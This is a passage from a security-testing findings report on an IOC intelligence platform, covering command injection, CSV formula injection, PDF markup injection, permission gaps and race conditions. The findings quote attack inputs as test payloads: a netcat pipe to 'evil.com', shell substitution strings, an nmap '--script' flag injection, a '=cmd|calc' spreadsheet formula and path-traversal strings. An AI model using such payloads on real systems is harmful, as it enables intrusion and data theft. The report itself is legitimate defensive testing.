- **Description:** Ran POST /api/v1/lookup/stream for 8.8.8.8 as the qa-ent-chaos analyst persona. Live provider_result statuses observed over SSE: virustotal=error (real HTTP 401 Unauthorized from https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8, live right now), abuseipdb=error (real HTTP 401 from https://api.abuseipdb.com/api/v2/check...), censys/threatfox/urlhaus=not_configured, otx=no_data (call succeeded, no data), internet_intelligence/spamhaus/whois_rdap=ok. The stream still reached the 'done' SSE event and the DB row (id a617f345-dfd5-4624-b29d-c29ee0a5b6d8, now deleted) ended with status=COMPLETED, final_verdict=BENIGN, risk_score=50, confidence_score=80 -- i.e. 2 real, currently-broken provider credentials did not sink the investigation. Code-level cause confirmed in app/providers/base.py's BaseProvider.run() (every fetch() wrapped in try/except httpx.HTTPStatusError -> RATE_LIMITED/ERROR, plus a catch-all Exception -> ERROR, both normalized to a ProviderResult rather than raised) and app/providers/orchestrator.py's run_all_providers() (each provider is an independent asyncio task; asyncio.as_completed yields each with its own try/except so one task's exception can't cancel or block the others).
- **Evidence:** SSE events from the live run (provider_id, status, error_message): ["virustotal","error","HTTP 401: ... virustotal.com/api/v3/ip_addresses/8.8.8.8"], ["abuseipdb","error","HTTP 401: ... api.abuseipdb.com/api/v2/check?ipAddress=8.8.8.8..."], final SSE event ("done", {"lookup_id":"a617f345-..."}); DB row before cleanup: status=COMPLETED, final_verdict=BENIGN, risk_score=50, confidence_score=80. Historical corroboration via read-only query: `SELECT l.status, pr.provider_id, pr.status, count(*) FROM provider_results pr JOIN ioc_lookups l ON l.id=pr.lookup_id WHERE pr.status IN ('error','rate_limited','timeout') GROUP BY 1,2,3` shows 11 abuseipdb 'error', 8 censys 'rate_limited', 9 virustotal 'error' all inside lookups whose overall status is COMPLETED.
- **Reproduction:** Mint an analyst JWT via app.auth.security.create_access_token for a real DB user; POST {"value":"8.8.8.8"} to /api/v1/lookup/stream with that bearer token; read the SSE stream to 'done'; GET the lookup row and observe status=COMPLETED despite 2 provider_result rows with status=error.

#### 26. Malformed IOC values are rejected with clean 422s before touching the DB or any provider

- **Severity:** info
- **Dimension:** IOC provider chaos (backend/app/providers registry + orchestrator resilience, malformed-input handling)
- **Title:** Malformed IOC values are rejected with clean 422s before touching the DB or any provider
- **Description:** detect_ioc_type() (app/ioc/detector.py) always returns a value (defaulting to UNKNOWN, never raises), and stream_lookup() (app/api/routes/lookup.py) checks `if ioc_type == IOCType.UNKNOWN: raise HTTPException(422, ...)` BEFORE creating the IOCLookup DB row or calling run_all_providers -- so a rejected value is never persisted and never reaches any provider's fetch(). Confirmed live for all 4 malformed inputs tried: empty string, a 50,000-character string, an emoji/unicode string, and a SQL-metacharacter string ("1' OR '1'='1"). All 4 returned HTTP 422 with body {"detail":"Could not determine IOC type; pass ioc_type_hint."}, 0 SSE events, and no lookup_id was ever created. The regexes involved (_DOMAIN_RE etc.) use a length-bounded lookahead ((?=.{1,253}$)) so the long-string case fails fast rather than risking ReDoS.
- **Evidence:** Live responses: empty_string -> {"http_status":422,"body":"{\"detail\":\"Could not determine IOC type; pass ioc_type_hint.\"}"}; extremely_long (50k chars) -> same 422; unicode_emoji -> same 422; sql_metachar ("1' OR '1'='1") -> same 422. All 4 had lookup_id_created=null. Read-only DB check after the run showed no ioc_lookups row for any of these values.
- **Reproduction:** POST {"value":""} (or a 50000-char string, or "\U0001F480\U0001F525", or "1' OR '1'='1") to /api/v1/lookup/stream with a valid analyst bearer token; observe HTTP 422 with detail 'Could not determine IOC type; pass ioc_type_hint.' and zero SSE events.

#### 27. GET /api/v1/providers/health's `configured` field is stale/wrong for several providers vs. the real runtime-DB-backed state actually used by investigations

- **Severity:** P3
- **Dimension:** IOC provider chaos (backend/app/providers registry + orchestrator resilience, malformed-input handling)
- **Title:** GET /api/v1/providers/health's `configured` field is stale/wrong for several providers vs. the real runtime-DB-backed state actually used by investigations
- **Description:** registry.py's get_provider_health() reports `configured` straight from each provider singleton's class-level `.configured` attribute, which for most providers is set once at process import time from app.core.config.Settings (itself sourced from the container's .env-derived env vars). Separately, app/core/runtime_config.py maintains a DB-backed provider_runtime_configs table (encrypted credentials, seeded from the same env vars but editable at runtime) which is what app/providers/orchestrator.py's get_ioc_provider_snapshot() + app/core/runtime_context.py's per-request override actually use to decide whether a provider's fetch() is attempted. These two notions of 'configured' have diverged live: GET /providers/health reports configured=false for virustotal, abuseipdb, and otx, yet the live investigation above actually dispatched real outbound calls to all three (virustotal/abuseipdb got real 401s from the live third-party APIs; otx succeeded with no_data) -- proving effective_configured was true for those three at request time. Conversely /providers/health reports censys as configured=false and the runtime DB genuinely didn't attempt it either (matches), but note ABUSECH_AUTH_KEY, CENSYS_PERSONAL_ACCESS_TOKEN and CENSYS_ORGANIZATION_ID are all present as container env vars yet threatfox/urlhaus/malwarebazaar/censys all show not_configured in both the static and runtime views -- the .env-to-runtime-DB seed step (app/core/runtime_config.py's _ENV_SEED_MAP) appears to not have populated/activated those. Impact is currently low: I checked the frontend and the only consumer of GET /providers/health (frontend/app/lookup/new/page.tsx) only reads `supported_types`, never `.configured`; the admin Providers page's 'Configured/Not configured' badge (components/dashboard/ProviderConfigRow.tsx) is fed by the separate, correct /runtime/ioc-providers endpoint. So no user-facing surface renders the wrong value today, but any future consumer of GET /providers/health's `configured` field (or an external integration trusting this documented API) would get misleading data.
- **Evidence:** GET /api/v1/providers/health (live, as qa-ent-chaos analyst) returned configured=false for virustotal, abuseipdb, otx, urlhaus, threatfox, malwarebazaar, hybrid_analysis, censys. The SAME live investigation's provider_result stream shows virustotal and abuseipdb were actually attempted (got real 401s from the live third-party APIs) and otx was actually attempted (got no_data) -- all three requiring requires_key=True and only reachable past the NOT_CONFIGURED short-circuit in app/providers/base.py's run() if effective_configured was True via the runtime override. Read-only DB query of provider_runtime_configs (kind='IOC') shows last_test_ok=true/'Connected. Key is valid.' for virustotal (tested 2026-08-14 02:18:22), otx (2026-08-14 02:34:45), and hybrid_analysis (2026-08-14 04:50:42), i.e. a runtime credential row exists and was validated for these, independent of the stale process-level Settings flag. Frontend grep confirmed only components/dashboard/ProviderConfigRow.tsx and AiQuickSwitch.tsx read `.configured` in the UI, both backed by /runtime/ioc-providers not /providers/health.
- **Reproduction:** As any authenticated user with lookup:read, GET /api/v1/providers/health and compare its `configured` field for virustotal/abuseipdb/otx against GET /api/v1/runtime/ioc-providers's `configured` field for the same provider_ids (admin-only, provider:manage) -- the two endpoints disagree.

#### 33. Long (but fully legitimate, schema-valid) target string causes an unhandled 500 and a permanently orphaned PENDING run -- a real silent-failure path

- **Severity:** P2
- **Dimension:** Security Assessment Toolkit (Nmap/DNS/TLS/HTTP-header/vuln-intel/hash tools) -- safety-boundary verification and real-scan testing
- **Title:** Long (but fully legitimate, schema-valid) target string causes an unhandled 500 and a permanently orphaned PENDING run -- a real silent-failure path
- **Description:** backend/app/core/security_assessment.py's start_run() commits the SecurityAssessmentRun row (status=PENDING) FIRST, then calls record_audit() with an f-string that embeds the caller's target_confirmation verbatim with no length cap: `f"Requested a security assessment ({', '.join(tool_ids)}, profile={profile_id!r}) against '{target_confirmation}'."`. app/core/audit.py's record_audit() does no truncation either, and app/models/runtime_config.py's ConfigAuditLog.detail column is `String(1000)`. Because IOCLookup.ioc_value is `String(2048)` (and URL-type IOCs routinely exceed 900 characters with query strings/tokens), any legitimately-storable target longer than ~933 characters (67-char fixed prefix + 1000-char column) makes this INSERT raise `asyncpg.exceptions.StringDataRightTruncationError: value too long for type character varying(1000)`. This happens BEFORE `_spawn_background(_execute_run(...))` is ever reached, so: (1) the client gets a broken/empty non-200 response instead of a clean 4xx or 200, and (2) the SecurityAssessmentRun row that was already committed is left in PENDING forever -- it will never run, never complete, never fail, and never surface any error, directly contradicting the toolkit's own design principle of clean, visible pass/fail status and 'no silent failure'. This is reachable by any ANALYST/ADMIN with a normal long URL IOC, not just a contrived attack string.
- **Evidence:** Reproduced live: created IOCLookup ioc_value='a'*1900+'.example.test' (1913 chars, well under the 2048-char column cap), POSTed target_confirmation=<same string>, authorization_confirmed=true, tool_ids=['nmap']. docker logs app-backend-1 showed: `sqlalchemy.exc.DBAPIError: ... asyncpg.exceptions.StringDataRightTruncationError: value too long for type character varying(1000) [SQL: INSERT INTO config_audit_log (...) VALUES (... 'aaaa...(1682 characters truncated)...aaaa.example.test'.)]` at 2026-08-15T10:39:37Z, tied to lookup id 0bcb8ccf-79d8-4cca-8063-9409b669c1b6 and the disposable test user qa-ent-isosec-f323f3ec@qa.test. The client's httpx response object had a non-200 status with an empty body (raised JSONDecodeError: 'Expecting value: line 1 column 1' when parsed). The resulting SecurityAssessmentRun row was confirmed still present, in PENDING, referencing that user via requested_by (blocking even test-user hard-delete via FK) until manually cleaned up.
- **Reproduction:** 1) Create an IOCLookup with ioc_type='domain'/'url' and ioc_value of length ~1000-2048 chars (e.g. 'a'*1900+'.example.test'). 2) POST /api/v1/security-assessment/{lookup_id}/run with {tool_ids:['nmap'], profile:'quick', target_confirmation:<same string>, authorization_confirmed:true} as any ANALYST/ADMIN. 3) Observe a non-200 response with an empty/unparseable body, and a SecurityAssessmentRun row stuck in PENDING indefinitely.

#### 34. All re-verified hard safety constraints on the toolkit held under live testing -- no exploit execution, no shell injection, no evasion, no silent/unauthorized scanning

- **Severity:** info
- **Dimension:** Security Assessment Toolkit (Nmap/DNS/TLS/HTTP-header/vuln-intel/hash tools) -- safety-boundary verification and real-scan testing
- **Title:** All re-verified hard safety constraints on the toolkit held under live testing -- no exploit execution, no shell injection, no evasion, no silent/unauthorized scanning
- **Description:** Fresh source read of nmap_tool.py/base.py/registry.py/security_assessment.py (service layer) confirmed: (a) every Nmap profile is a hardcoded argv list (no --script/-O/-sS/-sU/timing-evasion flags) invoked via asyncio.create_subprocess_exec with an explicit argument list, never create_subprocess_shell or string concatenation; (b) authorization_confirmed and exact target_confirmation-vs-lookup.ioc_value match are mandatory server-side checks in _validate_scope(), enforced before any DB row or background task is created; (c) CIDR targets are capped at /28 (16 addresses) via ipaddress.ip_network().num_addresses. Live testing confirmed every one of these behaviorally: target mismatch -> 400 'target_confirmation must exactly match...', zero run rows created; authorization_confirmed=false -> 400 'You must confirm you are authorized...'; CIDR /24 (256 addresses) -> 400 'Active scanning is limited to 16 addresses (/28)...'; CIDR exactly /28 -> accepted, real scan ran to completion. A real nmap 'quick' scan against 127.0.0.1 completed successfully (status=completed, 1 finding: 'Open port tcp/8000' matching the backend's own exposed port, no crash, no hang). GET /tool-health correctly reported nmap as available=true (real shutil.which check); an in-process-only monkeypatch of shutil.which to simulate nmap missing (never touching the live container) made is_available() return False and nmap_tool.run() return a clean ProviderStatus.ERROR result with error_message='nmap is not installed on this host.' -- never a silent failure. Six distinct malformed-target payloads (`;touch ...;`, backtick command substitution, `$(...)` subshell, `|`/`>` pipe-redirect, control characters 0x01/0x07/0x1b, and CRLF/newline injection) were each run as real nmap targets end-to-end: every run completed cleanly (nmap failed to resolve the bogus hostname, 0 findings, no error), and a marker-file check (`ls /tmp/qa_pwned_marker*`) after all six confirmed zero shell-injection side effects occurred. Postgres itself independently rejected a null-byte IOC value (`CharacterNotInRepertoireError: invalid byte sequence for encoding "UTF8": 0x00`) and an over-2048-char IOC value (`StringDataRightTruncationError: value too long for type character varying(2048)`) at the DB-insert layer, before ever reaching the toolkit -- reasonable defense-in-depth, not a gap.
- **Evidence:** Full request/response/log evidence for every sub-case captured during testing (status codes, response bodies, docker logs, marker-file absence) -- see reproduction steps; none of these constitute a finding needing a fix, listed here as a confirmation of intact controls per the task's re-verification requirement.
- **Reproduction:** —

#### 36. nmap_tool.py confirmed immune to OS command injection — argv-exec, no shell, target is one opaque token

- **Severity:** info
- **Dimension:** Command injection testing — Security Assessment Toolkit subprocess-invoking code paths (IOC Intelligence Platform)
- **Title:** nmap_tool.py confirmed immune to OS command injection — argv-exec, no shell, target is one opaque token
- **Description:** backend/app/security_assessment/nmap_tool.py builds argv = ["nmap", "-oX", "-", *_PROFILE_ARGS[profile_id], target] and invokes it via `await asyncio.create_subprocess_exec(*argv, ...)`. There is no create_subprocess_shell, os.system, or shell=True anywhere in backend/app (grep -rniE across the whole app tree, excluding .venv, matched only this one asyncio.subprocess.PIPE line). Because create_subprocess_exec calls execve()-style with an explicit argv list, each Python list element becomes exactly one OS-level argv slot; a single string containing shell metacharacters (';', '&&', '$()', backticks, '|') is never re-parsed by a shell and can never split into multiple commands or arguments.
- **Evidence:** All 6 required payloads run with the tool's exact argv shape (either directly or through the live HTTP API as target_confirmation on a real IOCLookup, using a disposable qa-ent-cmdinj@qa.test analyst persona): '127.0.0.1; touch /tmp/qa_ent_pwned' -> nmap stderr 'Unable to split netmask from target expression...WARNING: No targets were specified, so 0 hosts scanned.' rc=0. '127.0.0.1 && whoami', '$(whoami)', '`id`', '127.0.0.1|nc evil.com 4444' -> all produced 'Failed to resolve "<literal string>".' / 'No targets were specified, so 0 hosts scanned.' rc=0 -- i.e. nmap tried (and failed) to DNS-resolve the entire literal string as one hostname; whoami/id were never executed, no connection to evil.com was attempted. Via the real API (POST /api/v1/security-assessment/{lookup_id}/run with these exact strings as target_confirmation, HTTP 200, run status ended 'completed', findings_count=0 for every payload), and independently via docker exec, `test -f /tmp/qa_ent_pwned` was ABSENT both before and after every test run.
- **Reproduction:** Mint a JWT for a real disposable ANALYST-role DB user (app.auth.security.create_access_token(email, 'analyst') plus a matching app.core.users.create_user row, since get_current_user in app/auth/rbac.py does a DB lookup by email/token_version). Insert an IOCLookup row with ioc_type='ipv4' and ioc_value=<payload>. POST /api/v1/security-assessment/{lookup_id}/run with json={"tool_ids":["nmap"],"profile":"quick","target_confirmation":<payload>,"authorization_confirmed":true}. Poll GET /api/v1/security-assessment/runs/{run_id}. Confirm via `docker exec app-backend-1 test -f /tmp/qa_ent_pwned` that no side effect occurred.

#### 37. Single-argv-slot argument injection into nmap's own flag parser is possible but not exploitable given the current fixed argv shape

- **Severity:** P4
- **Dimension:** Command injection testing — Security Assessment Toolkit subprocess-invoking code paths (IOC Intelligence Platform)
- **Title:** Single-argv-slot argument injection into nmap's own flag parser is possible but not exploitable given the current fixed argv shape
- **Description:** nmap_tool.py's docstring explicitly states no profile ever includes `--script` (NSE = arbitrary code execution risk) or other intrusive flags, and that the target is 'one argv element, passed to the subprocess API directly.' That second claim is true, but it does not fully close the door on nmap's OWN CLI parser (independent of any shell) treating the target string as a flag rather than a hostname if it happens to start with '-'/'--' -- nmap does its own argv parsing (like any CLI tool) and does not know 'this argv slot is supposed to be a target only'. Tested with target_confirmation = '--script=vuln 127.0.0.1' (one of the 6 required payloads): nmap's NSE engine parsed this as the flag `--script` with value `vuln 127.0.0.1`, attempted to resolve that as a script category, and failed ('did not match a category, filename, or directory'), rc=1, no scan performed, no findings. Separately (outside the required payload list, added to close the loop) target='--script=vuln' alone (a real, valid NSE category name) WAS accepted by nmap's parser as a legitimate flag with no error -- but because it consumed the tool's single attacker-controlled argv slot, there was no target argv element left, so nmap reported 'WARNING: No targets were specified, so 0 hosts scanned.' (rc=0) and never loaded/ran any script against any host. Because nmap_tool.py's argv always places the attacker-controlled value as the single LAST list element (`[..., *_PROFILE_ARGS[profile_id], target]`), a single Python string can occupy only one OS-level argv slot -- there is no way for a single string (however many spaces it contains) to become two separate positional argv entries the way it would if the code used a shell. So this class of bug cannot currently be leveraged to both inject a flag AND supply a real target in the same request; it is a real gap relative to the code's own stated invariant ('no profile includes --script'), but not an exploitable one today. Recommended hardening (defense-in-depth, not urgent): reject/normalize target values starting with '-' before building argv, or insert a literal '--' end-of-options separator immediately before the target element.
- **Evidence:** Direct argv-shape test: argv=['nmap','-oX','-','-T4','-F','--top-ports','100','--script=vuln 127.0.0.1'] -> stderr: "NSE: failed to initialize the script engine:\n.../nse_main.lua:829: 'vuln 127.0.0.1' did not match a category, filename, or directory", rc=1. Follow-up: argv=[...,'--script=vuln'] (no trailing target) -> stderr: 'WARNING: No targets were specified, so 0 hosts scanned.', rc=0. Same behavior reproduced through the live API for the '--script=vuln 127.0.0.1' payload (HTTP 200, run completed, 0 findings).
- **Reproduction:** docker exec app-backend-1 python3 -c with argv=['nmap','-oX','-','-T4','-F','--top-ports','100','--script=vuln']; observe nmap accepts the flag but reports no targets scanned. Not independently reachable as a full exploit because the tool's argv construction leaves exactly one attacker-controlled slot, always in the terminal target position.

#### 38. Lookup creation lets a caller assign an arbitrary IOCType label to an arbitrary/unvalidated string via ioc_type_hint, which is the actual mechanism by which a non-IP string can reach nmap_tool.py's target parameter as a scannable IPV4 target

- **Severity:** P3
- **Dimension:** Command injection testing — Security Assessment Toolkit subprocess-invoking code paths (IOC Intelligence Platform)
- **Title:** Lookup creation lets a caller assign an arbitrary IOCType label to an arbitrary/unvalidated string via ioc_type_hint, which is the actual mechanism by which a non-IP string can reach nmap_tool.py's target parameter as a scannable IPV4 target
- **Description:** This is not a command-injection bug (nmap_tool.py's argv-exec handling is safe as shown above) but it is the realistic path by which an attacker-controlled, non-IP-shaped string ends up seeded as target for the Nmap/TLS/DNS/HTTP-header tools in the first place. app/api/routes/lookup.py's POST /lookup/stream computes `ioc_type = payload.ioc_type_hint or detect_ioc_type(ioc_value)` -- if the caller supplies `ioc_type_hint`, detect_ioc_type() (and all its format regexes/ipaddress.ip_address() parsing) is skipped entirely, and the raw string is stored as IOCLookup.ioc_value with whatever ioc_type the caller asked for. app/core/security_assessment.py's _validate_scope() then only checks `lookup.ioc_type in SCANNABLE_TYPES` and (for CIDR only) parses lookup.ioc_value with ipaddress.ip_network -- for IPV4/IPV6/DOMAIN/HOSTNAME it never re-validates that ioc_value is actually shaped like an IP/hostname before treating it as a valid nmap/tls/dns/http-headers target. So a caller with only lookup:create (any ANALYST/ADMIN role) can create a lookup with ioc_value='anything they want' and ioc_type_hint='ipv4', then (separately, with security_assessment:create) request a scan against it with target_confirmation equal to that same arbitrary string. Confirmed via source review of app/api/routes/lookup.py line 81 and app/core/security_assessment.py line 113-130; not separately re-exercised through the live /lookup/stream HTTP endpoint in this pass to avoid triggering real external threat-intel provider calls for six garbage strings (out of scope/cost concern for this dimension) -- the equivalent DB state (IOCLookup with ioc_type='ipv4' and an arbitrary ioc_value) was instead created directly, which is exactly the state /lookup/stream + ioc_type_hint would produce, and was itself the object of every test above.
- **Evidence:** app/api/routes/lookup.py:81 `ioc_type = payload.ioc_type_hint or detect_ioc_type(ioc_value)` with no re-validation against the hint; app/schemas/lookup.py:11 `ioc_type_hint: Optional[IOCType] = None` (any enum value, unconstrained relative to `value`); app/core/security_assessment.py:113-130 `_validate_scope()` never calls ipaddress.ip_address()/hostname-format validation for IPV4/IPV6/DOMAIN/HOSTNAME types, only for CIDR.
- **Reproduction:** POST /api/v1/lookup/stream with json={"value": "<arbitrary string>", "ioc_type_hint": "ipv4"} as any lookup:create-permitted user; inspect the resulting IOCLookup row's ioc_type/ioc_value. NOT independently executed against the live provider fan-out in this pass -- inferred from source and from the equivalent DB state used in the tests above.

- **Severity:** info
- **Dimension:** File security (server-side export / path-traversal surface)
- **Title:** docs/DOCUMENTATION_GAPS.md and docs/API_DOCUMENTATION.md are stale: server-side PDF/CSV export IS now implemented and live

A regression test file (backend/app/tests/unit/test_lookup_export.py) exists specifically because this gap was found and fixed previously.

#### 40. CSV export writes raw, unescaped IOC values into cells -- CSV/formula injection (CWE-1236)

- **Severity:** P2
- **Dimension:** File security (server-side export / path-traversal surface)
- **Title:** CSV export writes raw, unescaped IOC values into cells -- CSV/formula injection (CWE-1236)
- **Description:** _render_csv() (backend/app/api/routes/lookup.py:476-496) writes `lookup.ioc_value` and other fields verbatim into CSV cells via csv.writer with no neutralization of a leading =, +, -, or @. LookupCreateRequest.value (backend/app/schemas/lookup.py) has no character restriction, and free-text IOC types (malware_family, threat_actor, campaign, etc.) accept arbitrary strings via `ioc_type_hint`, so any analyst/admin can create a lookup whose 'ioc_value' is a formula payload. When another analyst exports that lookup to CSV and opens it in Excel/LibreOffice, the leading '=' is interpreted as a formula (classic DDE/formula-injection vector, e.g. exfiltration via WEBSERVICE()/HYPERLINK() or, on older Excel configs with DDE enabled, command execution).
- **Evidence:** Created a disposable lookup via POST /api/v1/lookup/stream with {"value": "=1+1+cmd|calc!A1", "ioc_type_hint": "malware_family"} as qa-ent-analyst-a@qa.test. Exported CSV (200 OK) contained verbatim: `ioc_value,=1+1+cmd|calc!A1` with no quoting/escaping/leading-apostrophe neutralization. Test lookup (id 45545891-1ada-4839-9faf-f1f6d916db3a) deleted after test; verified 0 rows remain.
- **Reproduction:** 1) POST /api/v1/lookup/stream {value:'=1+1+cmd|calc!A1', ioc_type_hint:'malware_family'} as any analyst -> get lookup_id. 2) POST /api/v1/lookup/{lookup_id}/export?format=csv -> response body's second line is 'ioc_value,=1+1+cmd|calc!A1' unescaped.

#### 41. PDF export interpolates raw IOC/assessment text into a ReportLab Paragraph -- markup injection causing a crash on malformed input and rendering-level content injection on well-formed input

- **Severity:** P2
- **Dimension:** File security (server-side export / path-traversal surface)
- **Title:** PDF export interpolates raw IOC/assessment text into a ReportLab Paragraph -- markup injection causing a crash on malformed input and rendering-level content injection on well-formed input
- **Description:** _render_pdf() (backend/app/api/routes/lookup.py:499-571) builds `Paragraph(f"IOC Assessment: {lookup.ioc_value}", ...)` and several other Paragraph/_section calls directly from lookup.ioc_value and AI-generated FinalAssessment text, with zero XML-escaping. ReportLab's Paragraph parses its input as a small XML/HTML-like markup dialect. (a) A value containing an unclosed/malformed tag makes reportlab.platypus.paraparser raise ValueError, which is uncaught -> unhandled 500 on every future export attempt of that specific lookup (denial of service for that record's PDF export). (b) A value containing a well-formed tag (e.g. <font color="red" size="40">...) is accepted by reportlab as real markup and renders successfully (200), meaning the free-text IOC value can inject arbitrary formatting/spoofed content into an otherwise 'official-looking' exported SOC report.
- **Evidence:** Case (a): created lookup with value='<b>INJECTED</b> title & unclosed <tag AAAA', ioc_type_hint='malware_family' (id 4a61fa8c-c4c4-45af-83f7-1169896fe12a). POST .../export?format=pdf -> HTTP 500. Backend log traceback (docker logs app-backend-1) shows: `File ".../app/api/routes/lookup.py", line 514, in _render_pdf -> story = [Paragraph(f"IOC Assessment: {lookup.ioc_value}", styles["Title"])] ... reportlab/platypus/paraparser.py ... ValueError: paraparser: syntax error: parse ended with 1 unclosed tags / para`. Case (b): created lookup with value='<font color="red" size="40">FAKE-VERDICT-INJECTED</font>', ioc_type_hint='malware_family' (id 8fddb9cb-6b69-48ec-8799-60ded65f0a34). POST .../export?format=pdf -> HTTP 200, valid PDF returned (whereas the malformed-tag case with an unclosed tag 500'd, confirming reportlab is genuinely parsing this text as markup rather than displaying it literally). Both test lookups deleted after test; verified 0 rows remain.
- **Reproduction:** 1) POST /api/v1/lookup/stream {value:'<b>INJECTED</b> title & unclosed <tag AAAA', ioc_type_hint:'malware_family'} -> lookup_id. 2) POST /api/v1/lookup/{lookup_id}/export?format=pdf -> 500 Internal Server Error, confirmed via container logs to be the reportlab paraparser ValueError shown above.

#### 42. Export endpoint is gated on lookup:read instead of the dedicated lookup:export permission -- VIEWER role can download exports despite the permission matrix (and the docs) explicitly reserving a separate permission to prevent that

- **Severity:** P2
- **Dimension:** File security (server-side export / path-traversal surface)
- **Title:** Export endpoint is gated on lookup:read instead of the dedicated lookup:export permission -- VIEWER role can download exports despite the permission matrix (and the docs) explicitly reserving a separate permission to prevent that
- **Description:** backend/app/models/user.py's ROLE_PERMISSIONS grants 'lookup:export' to ADMIN and ANALYST but NOT to VIEWER (VIEWER only gets {'lookup:read','evidence:read','case:read','security_assessment:read'}). docs/API_DOCUMENTATION.md itself documents this: '| `lookup:export` | Yes | Yes | No |' (line 57) and explicitly instructs that when a real export endpoint is built it 'should ... be gated behind the already-reserved `lookup:export` permission' (lines 423-425). However, `export_lookup()` in backend/app/api/routes/lookup.py:574-579 uses `Depends(require_permission("lookup:read"))`, not lookup:export. Since VIEWER already has lookup:read, a VIEWER-role user can successfully call the export endpoint and download real PDF/CSV files, contradicting the documented/intended design. `lookup:export` is dead code -- it is defined in the permission matrix but never referenced by `require_permission` anywhere in the codebase (grep across backend/app confirms zero uses outside the matrix definition itself).
- **Evidence:** Minted a viewer-role JWT for the pre-existing disposable account qa-ent-viewer-a@qa.test (role VIEWER, is_active=true) and an existing lookup id. GET /api/v1/lookup/{id} -> 200 (expected, lookup:read). POST /api/v1/lookup/{id}/export?format=csv as the same viewer token -> 200, 334 bytes of real CSV content. POST .../export?format=pdf as viewer -> 200, 2185 bytes starting with b'%PDF'. Unauthenticated request to the same endpoint -> 401 (auth itself works; it's the role-permission check that's wrong). No test rows created for this check (used only a pre-existing viewer account and a pre-existing lookup, both read-only).
- **Reproduction:** Mint an access token with role='viewer' for qa-ent-viewer-a@qa.test (existing disposable account, is_active=true, token_version=0) via app.auth.security.create_access_token. Call POST /api/v1/lookup/{any_lookup_id}/export?format=csv (or pdf) with that token -> 200 with real file content, despite VIEWER lacking 'lookup:export' in ROLE_PERMISSIONS.

#### 43. No path-traversal surface exists anywhere in the backend's file-producing code (confirmed absence, reported for completeness)

- **Severity:** info
- **Dimension:** File security (server-side export / path-traversal surface)
- **Title:** No path-traversal surface exists anywhere in the backend's file-producing code (confirmed absence, reported for completeness)
- **Description:** Full-repo grep of backend/app (excluding tests) for open(, Path(, os.path.join(, NamedTemporaryFile, mkstemp, shutil.*, UploadFile, StaticFiles, FileResponse, tempfile, .write(, and 'filename' found no filesystem operation anywhere that incorporates a request-derived string. The only export-adjacent 'filename' usage is `filename = f"ioc-assessment-{lookup_id}.{format}"` in lookup.py, used solely inside an HTTP Content-Disposition header string -- never passed to any filesystem call. `lookup_id` is typed `uuid.UUID` as a FastAPI path parameter (rejected with 422/404 before reaching the handler if not a valid UUID -- confirmed live with '../../../etc/passwd' and URL-encoded traversal payloads, both blocked before the handler ran) and `format` is a Pydantic `Literal['pdf','csv']` (confirmed live: any other value, including traversal strings, returns 422). Both `_render_csv`/`_render_pdf` build output entirely in memory (io.StringIO/io.BytesIO) and return it as an HTTP Response body -- no disk I/O occurs at all. The Security Assessment Toolkit's hash_tool.py performs pure string/regex analysis on the hash value with zero file I/O (confirmed by reading the full file), and nmap_tool.py's only filesystem-adjacent call is `shutil.which('nmap')` (binary existence check, not user-data-driven). There is no file-upload endpoint, no StaticFiles mount, and no FileResponse anywhere in the backend.
- **Evidence:** grep -rn "open(\|Path(\|os\.path\.join(\|NamedTemporaryFile\|mkstemp\|shutil\." backend/app (excl. tests) -> only hit is nmap_tool.py:95 `shutil.which("nmap")`. Live traversal probes against both the `format` query param and the `lookup_id` path param (`../../../etc/passwd`, `pdf/../../etc/passwd`, `..%2f..%2fetc%2fpasswd`) all returned 422 or 404, never reaching any file operation.
- **Reproduction:** N/A -- negative finding confirmed by full source review plus live probing of the export endpoint's two parameters with traversal payloads.

#### 44. Refreshing mid-investigation does not resume it -- it silently abandons the original and starts a brand-new duplicate investigation

- **Severity:** P2
- **Dimension:** Frontend chaos testing (real browser automation)
- **Title:** Refreshing mid-investigation does not resume it -- it silently abandons the original and starts a brand-new duplicate investigation
- **Description:** `/lookup/new?value=X` always POSTs a fresh `/api/v1/lookup/stream` on mount and never navigates to a persistent `/lookup/{id}` URL after completion, so there is nothing to 'resume' from. A full-page reload (F5) re-mounts the page and fires an entirely new POST, creating a second, independent `IOCLookup` row for the same value while the first is abandoned server-side (its client connection drops, so it never reaches `final_assessment`/`completed`). The UI shows no warning that this will happen, and the post-refresh screen looks visually identical to the pre-refresh screen (same '2/8 providers responded, PENDING' layout), completely masking that a new investigation -- with its own fresh round of provider calls and AI calls -- was just started from zero.
- **Evidence:** Reproduced twice. DB ground truth (docker exec app-postgres-1 psql): for ioc_value 'chaos-refresh-1786790732124.example.com', two ioc_lookups rows exist 4 seconds apart (b0beb0ad-..., created 10:45:32; d2235fde-..., created 10:45:36), BOTH status=FAILED. Same pattern repeated for 'chaos-refresh-1786791010000.example.com' (02aeb02b-... and c9e5f7b1-..., 4s apart, both FAILED). Screenshots chaos-01-1-before-refresh-mid-lookup.png and chaos-02-1-immediately-after-refresh.png (C:\Users\User\ioc-intel-platform\documentation\build\raw-screenshots\) are pixel-identical in layout despite being two different lookup_ids under the hood.
- **Reproduction:** 1) Log in as an analyst. 2) Go to /lookup/new?value=<any new domain>. 3) Wait ~3s so some provider_result events land but the investigation is not done. 4) Press F5 (full reload). Query ioc_lookups for that value afterward: two rows appear instead of one, and the first is FAILED.

#### 45. Concurrent 'Add to Basket' for the same new IOC (double-click or two tabs) throws an unhandled IntegrityError -> raw 500

- **Severity:** P2
- **Dimension:** Frontend chaos testing (real browser automation)
- **Title:** Concurrent 'Add to Basket' for the same new IOC (double-click or two tabs) throws an unhandled IntegrityError -> raw 500
- **Description:** `add_to_basket` in backend/app/api/routes/basket.py does a check-then-insert (SELECT existing, then INSERT if none) that is not atomic. When two requests for the same not-yet-basketed ioc_value race within the same transaction window, both pass the SELECT, then the second INSERT hits the `uq_basket_owner_ioc` unique constraint and raises `sqlalchemy.exc.IntegrityError`, which is never caught in this route (contrast with the equivalent upsert pattern in app/core/runtime_config.py and app/core/users.py, which both explicitly catch IntegrityError). This surfaces to the client as a bare 'Internal Server Error' (no JSON body). The frontend's generic catch turns this into a vague 'Failed to add to basket.' toast for what the user experiences as an ordinary click on their own basket.
